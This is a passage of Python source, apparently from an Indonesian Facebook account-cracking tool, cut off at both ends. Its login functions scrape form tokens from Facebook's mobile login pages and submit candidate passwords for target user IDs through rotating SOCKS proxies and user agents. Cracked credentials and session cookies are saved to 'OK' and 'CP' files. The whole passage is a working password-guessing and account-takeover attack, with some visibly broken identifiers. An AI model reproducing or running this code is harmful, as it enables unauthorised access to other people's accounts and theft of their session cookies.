			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1694528995138%26e2e%3D%257B%2522init%2522%253A1694528995139%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D3131f419-7a89-4e33-a62b-8aa7a8788021%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3f61d7bf-a98b-46b0-a5b9-52917cf711c5%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1694528995138%26e2e%3D%257B%2522init%2522%253A1694528995139%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D3131f419-7a89-4e33-a62b-8aa7a8788021%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3f61d7bf-a98b-46b0-a5b9-52917cf711c5%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=953097631439235&auth_token=1ef022a98f148abfc64c688a7c5a872e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D953097631439235%26cbt%3D1694527938425%26e2e%3D%257B%2522init%2522%253A1694527938425%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26nonce%3D6e332152-92c4-4d0a-aa2b-bc4ba4befe48%26scope%3Dopenid%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25226e332152-92c4-4d0a-aa2b-bc4ba4befe48%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227hhppsvr0qgnuu1o5825%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb953097631439235%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6e332152-92c4-4d0a-aa2b-bc4ba4befe48%26tp%3Dunspecified&refsrc=deprecated&app_id=953097631439235&cancel=fb953097631439235%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25226e332152-92c4-4d0a-aa2b-bc4ba4befe48%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227hhppsvr0qgnuu1o5825%2522%257D%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\[bold cyan]r>>>>{K}[purple]{idf}|[blue]{pw}{N}\n>>>>{P}[red]{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\[bold cyan]r>>>>{H}[purple]{idf}|[blue]{pw}{N}\n[bold cyan]>>>>{P}[green]{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---------------------[ METODE-TOUCH-3 ]---------------------#
def metod3(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{x}[M3] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1096408964130955&auth_token=46c61636e7c46590956dbdf2060b3ea3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&refsrc=deprecated&app_id=1096408964130955&cancel=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V1[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xdz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V2[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def validate3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V3[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_ca